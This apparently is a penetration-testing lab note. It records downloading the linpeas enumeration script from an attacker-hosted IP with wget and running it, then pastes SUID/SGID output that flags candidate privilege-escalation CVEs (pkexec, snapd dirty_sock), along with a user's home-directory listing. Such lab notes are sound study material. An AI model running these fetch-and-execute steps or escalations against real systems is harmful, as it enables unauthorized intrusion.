## command
download linpeas
```
wget http://192.168.45.218:8000/linpeas.sh
```

execute
```
chmod +x ./linpeas.sh; ./linpeas.sh
```

## result

### SUID and SGID
```
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                        
                      ╚════════════════════════════════════╝                                                                                                                                              
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                          
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                                            
-rwsr-xr-x 1 root root 84K Mar 14  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 87K Mar 14  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 163K Feb  3  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 67K Mar 14  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K Mar 14  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 44K Mar 14  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 140K May 11  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Apr 29  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Sep 16  2020 /snap/core18/2566/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/2566/bin/ping
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2566/bin/su
-rwsr-xr-x 1 root root 27K Sep 16  2020 /snap/core18/2566/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2566/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2566/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2566/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 14  2022 /snap/core18/2566/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 14  2022 /snap/core18/2566/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Jan 19  2021 /snap/core18/2566/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K May  6  2022 /snap/core18/2566/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar 30  2022 /snap/core18/2566/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Jan  8  2020 /snap/core18/1705/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1705/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1705/bin/su
-rwsr-xr-x 1 root root 27K Jan  8  2020 /snap/core18/1705/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1705/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1705/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1705/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/1705/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/1705/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /snap/core18/1705/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1705/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 121K Sep 29  2022 /snap/snapd/17336/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1623/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1623/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1623/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1623/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1623/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1623/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1623/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1623/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1623/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Apr 29  2022 /snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1623/usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                          
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                                            
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 343K Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 83K Mar 14  2022 /usr/bin/chage
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Mar 14  2022 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /snap/core18/2566/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /snap/core18/2566/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 14  2022 /snap/core18/2566/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 14  2022 /snap/core18/2566/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar 30  2022 /snap/core18/2566/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /snap/core18/2566/usr/bin/wall
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1705/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1705/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /snap/core18/1705/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /snap/core18/1705/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/1705/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /snap/core18/1705/usr/bin/wall
-rwxr-sr-x 1 root shadow 83K Mar 14  2022 /snap/core20/1623/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Mar 14  2022 /snap/core20/1623/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1623/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1623/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1623/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1623/usr/sbin/unix_chkpwd
```
#### images
![](images/Pasted%20image%2020240518041433.png)

![](images/Pasted%20image%2020240518041443.png)

### user files
```
╔══════════╣ Files inside /home/anita (limit 20)
total 888                                                                                                                                                                                                 
drwxr-xr-x 6 anita anita    4096 May 17 19:04 .
drwxr-xr-x 7 root  root     4096 Oct 12  2022 ..
-rw------- 1 anita anita       3 Nov 11  2022 .bash_history
-rw-r--r-- 1 anita anita     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 anita anita    3771 Feb 25  2020 .bashrc
drwx------ 2 anita anita    4096 Oct 26  2022 .cache
drwx------ 3 anita anita    4096 May 17 19:04 .gnupg
-rwxrwxr-x 1 anita anita  860337 May 12 04:25 linpeas.sh
-rw-r--r-- 1 root  root       33 May 17 16:07 local.txt
-rw-r--r-- 1 anita anita     807 Feb 25  2020 .profile
drwx------ 3 anita anita    4096 May 17 19:04 snap
drwxr-x--- 2 anita apache   4096 Oct 28  2022 .ssh
```

### system info
![](images/Pasted%20image%2020240518041649.png)

